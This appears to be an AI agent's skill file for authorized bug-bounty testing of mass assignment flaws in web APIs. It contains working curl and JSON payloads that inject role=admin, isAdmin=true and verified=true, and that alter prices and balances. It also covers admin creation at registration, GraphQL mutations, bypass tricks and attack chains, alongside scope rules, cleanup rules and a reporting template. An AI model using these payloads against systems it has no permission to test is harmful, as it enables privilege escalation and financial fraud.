---
name: mass-assignment
description: Mass Assignment (parameter pollution / auto-binding) — sending undocumented fields in API requests to set privileged attributes (admin, role, isAdmin, verified, balance, price, permissions). Use when HauntMode flags mass assignment as APPLIES/MAYBE, when an API resource's GET response contains more fields than the POST/PUT accepts, or when testing role/privilege escalation via JSON body manipulation.
---

# Mass Assignment — Parameter Pollution in APIs

This skill covers identification, field enumeration, privilege escalation, price/balance manipulation, and API-specific patterns. Read top to bottom on first invocation.

---

## 1. Triggers — when this skill applies

- REST API with GET responses containing more fields than the POST/PUT input form exposes
- JSON request body on a profile update, registration, or account creation endpoint
- Any endpoint where a resource object (user, order, product, account) is updated
- `role`, `isAdmin`, `admin`, `verified`, `active`, `enabled`, `group`, `permissions` appearing in GET responses but absent from documented input fields
- E-commerce: order creation or cart submission where `price`, `discount`, `total` might be accepted from client
- Ruby on Rails, Laravel, Django REST Framework, Node.js/Express, Spring Boot apps (all historically vulnerable to mass assignment by default without explicit allowlisting)
- PUT/PATCH requests on user profile or account resource

---

---

## 3. 30-second triage

1. Intercept a GET request to a resource (e.g., `GET /api/user/1`). Note all fields in the response.
2. Intercept the corresponding update request (PUT/PATCH/POST to same resource). Note which fields are sent.
3. Compare: are there fields in the GET response that are NOT in the PUT/POST? Those are candidates.
4. Add the missing privileged fields to the PUT/POST body and send.
5. Issue a new GET to the resource — did the server accept and apply the extra fields?

If yes → mass assignment confirmed.

---

## 4. The core methodology — GET then compare

**Step 1 — GET the resource to enumerate all fields:**

```bash
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET.com/api/v1/profile" | python3 -m json.tool
```

Example response — note ALL fields:
```json
{
  "id": 42,
  "username": "testuser",
  "email": "test@example.com",
  "full_name": "Test User",
  "about": "bio here",
  "role": "user",
  "isAdmin": false,
  "verified": true,
  "active": true,
  "credits": 0,
  "created_at": "2025-01-01T00:00:00Z"
}
```

**Step 2 — Look at what the update endpoint normally sends:**

Intercept the profile update request. It probably only sends:
```json
{
  "email": "test@example.com",
  "full_name": "Test User",
  "about": "bio here"
}
```

**Step 3 — Add the privileged fields and test:**

```bash
curl -X PUT \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","full_name":"Test User","about":"bio","role":"admin","isAdmin":true}' \
  "https://TARGET.com/api/v1/profile"
```

**Step 4 — Verify the change stuck:**

```bash
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET.com/api/v1/profile" | python3 -m json.tool
```

Check if `role` is now `admin` or `isAdmin` is now `true`.

---

## 5. Key target fields — always test these

When adding fields to a request body, these are the highest-value candidates:

**Privilege escalation:**
- `role` — try: `"admin"`, `"administrator"`, `"superuser"`, `"moderator"`, `"staff"`, `"web_admin"`
- `isAdmin` — try: `true`, `1`, `"true"`
- `admin` — try: `true`, `1`, `"yes"`
- `is_admin` — try: `true`, `1`
- `group` — try: `"admin"`, `"administrators"`, `"staff"`
- `permissions` — try: `["admin"]`, `["*"]`, `["read","write","admin"]`
- `verified` — try: `true` (may bypass email verification requirements)
- `active` — try: `true` (may enable a suspended/inactive account)
- `enabled` — try: `true`
- `account_type` — try: `"premium"`, `"business"`, `"enterprise"`, `"unlimited"`

**Financial manipulation:**
- `balance` — try: `9999999`
- `credits` — try: `9999999`
- `price` — try: `0`, `0.01` (on order creation)
- `discount` — try: `100`, `99.99`
- `total` — try: `0` (on checkout)
- `amount` — try: a manipulated value

**Identity:**
- `uid` — try another user's UID (also IDOR)
- `uuid` — try another user's UUID
- `user_id` — try another user's ID

---

## 6. API registration / account creation

Mass assignment is especially dangerous at registration/account creation (`POST /api/users` or `POST /register`) because there is often less validation than on update endpoints:

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "P@ssw0rd123",
    "role": "admin",
    "isAdmin": true,
    "verified": true,
    "active": true
  }' \
  "https://TARGET.com/api/v1/register"
```

If this creates an account with `admin` role, it is a critical finding — no authentication required.

---

## 7. Frameworks and common patterns

### Ruby on Rails

Rails uses `permit()` in strong parameters. If a developer uses `.permit!` (permit all) or forgets to restrict:
```ruby
# Vulnerable: permits all params
def user_params
  params.require(:user).permit!
end

# Also vulnerable: missing sensitive fields in deny-list approach
params.require(:user).permit(:name, :email) # but what about :role?
```

Rails app indicators: `.json` or `.xml` format params, `authenticity_token` in forms.

### Laravel

Laravel uses `$fillable` vs `$guarded` on models. If `$guarded = []` (empty), all fields are mass-assignable.

### Django REST Framework

DRF serializers use `fields` or `read_only_fields`. If a field is not in `read_only_fields`, it can be set via API.

### Node.js / Express

Common with `mongoose` (MongoDB) — if schema fields don't use `set: false`, they can be assigned from request body.

Mongoose example — attacker sets `isAdmin`:
```javascript
// Vulnerable — spreads entire req.body onto user object
User.findByIdAndUpdate(req.user.id, req.body)

// Secure — explicitly pick fields
User.findByIdAndUpdate(req.user.id, { name: req.body.name, email: req.body.email })
```

---

## 8. Order/checkout price manipulation

For e-commerce targets, test whether the server trusts client-supplied prices:

**Step 1 — Add an item to cart normally, intercept the final checkout or order-creation POST.**

**Step 2 — Look for price-related fields in the request:**
```json
{"product_id": 5, "quantity": 1, "price": 99.99}
```

**Step 3 — Modify the price:**
```json
{"product_id": 5, "quantity": 1, "price": 0.01}
```

**Step 4 — Confirm the order was created at the manipulated price.**

The server should calculate prices server-side from the product catalog, not trust client-supplied values. If it accepts the client price → critical finding.

---

## 9. Nested object and array fields

Some APIs use nested structures:

```json
{
  "user": {
    "profile": {
      "name": "TestUser",
      "permissions": ["read"]
    }
  }
}
```

Try injecting into nested objects:
```json
{
  "user": {
    "profile": {
      "name": "TestUser",
      "permissions": ["read", "admin", "write"]
    },
    "role": "admin"
  }
}
```

For array-based permissions, also try:
```json
{"permissions": ["*"]}
{"permissions": ["admin"]}
{"role_ids": [1, 2, 3, 999]}
```

---

## 10. GraphQL mass assignment

GraphQL mutations may accept undocumented fields in input types. If introspection is enabled:

1. Fetch the schema with introspection to enumerate all input type fields
2. Add privileged fields (role, isAdmin, etc.) to mutations that accept user input objects

```graphql
mutation {
  updateProfile(input: {
    name: "Attacker"
    email: "attacker@evil.com"
    role: "admin"
    isAdmin: true
  }) {
    id
    role
    isAdmin
  }
}
```

---

## 11. Confirmation

Mass assignment is confirmed when:
1. A GET request to the resource shows the modified field value (e.g., `"role": "admin"`)
2. The application's behavior changes to reflect the new privilege level (e.g., you can now access `/admin`, or your role badge shows "Admin")
3. The change was applied without the server rejecting the extra fields

For privilege escalation: always verify the privilege is actually enforced by attempting to access a resource that requires that privilege.

---

## 12. Bypass techniques — when the direct add fails

- **Try alternate field names:** `isAdmin` vs `is_admin` vs `admin` vs `adminRole` vs `superuser`
- **Try type variations:** `"role": "admin"` vs `"role_id": 1` vs `"role": 1`
- **Try nested vs flat:** `{"role": "admin"}` vs `{"user": {"role": "admin"}}`
- **Try adding to query string:** `PUT /api/profile?role=admin` while also sending the JSON body
- **Try HTTP verb tampering:** if PUT rejects extra fields, try PATCH (partial update semantics may be implemented differently) — invoke `verb-tampering` skill
- **Try on different API versions:** `/api/v1/` vs `/api/v2/` — different versions may have different validation strictness
- **Intercept the response and modify before it reaches the app:** some SPA apps read role from API response and cache it — modifying the response (via Burp match-and-replace) may elevate client-side privileges without server-side confirmation

---

## 13. False-positive checks

- Verify the server-side change stuck — not just that the server returned 200. Issue a fresh GET after the PUT and confirm the field value changed.
- Some APIs echo back the request body in the response (mirrors what you sent) but do not actually persist the extra fields — always do a separate GET to confirm.
- Confirm that the privilege level is actually enforced: setting `isAdmin: true` should result in access to admin endpoints; if it doesn't, the field may be accepted but not used for authorization.
- If the field is accepted in the request but not reflected in the GET response and not enforced, it may be silently ignored — document as "field accepted but appears to have no effect" (still worth noting as a defense-depth concern).

---

## 14. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Mass assignment → role=admin → access admin API endpoints | `idor` | Admin privilege escalation |
| Mass assignment → isAdmin=true → access admin panel | `auth-bypass` | Full admin takeover |
| Mass assignment → price=0 on order creation | (standalone) | Financial impact / fraud |
| Mass assignment → balance manipulation | (standalone) | Financial impact |
| Mass assignment on registration → create admin account without auth | (standalone) | Critical — no auth needed |
| Mass assignment → change victim's role via IDOR + mass assignment | `idor` | Chain: read victim UUID → set their role |
| Mass assignment → verified=true → bypass email verification → login | `auth-bypass` | Registration bypass |
| API mass assignment → extra fields logged → injection via logged field | `sqli`, `ssti`, `cmdi` | Second-order injection |

---

## 15. Reporting template

```
POTENTIAL FINDING: Mass Assignment
Target: <full URL of vulnerable endpoint>
Method: <PUT | POST | PATCH>
Field(s) accepted: <list of privileged fields the server accepted>
Normal request body:
    <what the UI normally sends>
Modified request body:
    <what was sent with extra fields added>
GET response after modification:
    <excerpt showing the changed field value>
Privilege enforced: <yes — accessed /admin successfully | no — field stored but not enforced>
Impact:
    <e.g. "Any authenticated user can set their account role to admin by adding role=admin to their profile update request">
    <e.g. "Order prices are accepted from the client; attacker can purchase any item for $0.01">
    <e.g. "Account registration accepts isAdmin=true, creating an admin account without any authorization">
Chain potential: <e.g. "Admin role enables IDOR on /api/admin/users to dump all PII">
Next step: <confirm admin access by reaching admin-only endpoint, or demonstrate financial impact with $0 purchase>
```

---

## 16. Recon tracker vector strings

Only log if user explicitly instructs (CLAUDE.md hard rule):

- `mass-assign:role:<endpoint>` — role/privilege field accepted
- `mass-assign:price:<endpoint>` — price/financial field accepted
- `mass-assign:verified:<endpoint>` — verification bypass via field
- `mass-assign:registration:<endpoint>` — admin creation at registration without auth
- `mass-assign:confirmed-enforced:<endpoint>` — privilege field accepted and enforced
- `mass-assign:accepted-not-enforced:<endpoint>` — field accepted but has no observable effect
- `mass-assign:no:<endpoint>` — extra fields rejected by server

---

## 17. What NOT to do

- Do not leave mass-assigned admin accounts on the target — clean up any test accounts or role changes after capturing evidence
- Do not exploit mass assignment on financial endpoints (set price=0) beyond a single test order to prove the vulnerability — do not generate significant financial impact or actual transactions
- Do not perform mass assignment on other users' accounts (that crosses into IDOR) without being aware you are combining two finding categories
- Do not assume all frameworks are vulnerable — modern Rails with strong parameters, Django with read_only_fields, and properly configured Laravel are not vulnerable; test before reporting
- Do not report "field accepted in response body but not persisted" as confirmed mass assignment — always verify server-side persistence via a fresh GET
- Do not auto-log to the recon tracker without explicit user instruction
- Do not test on out-of-scope endpoints — re-read `scope.txt` and `program-guidelines.txt` before testing
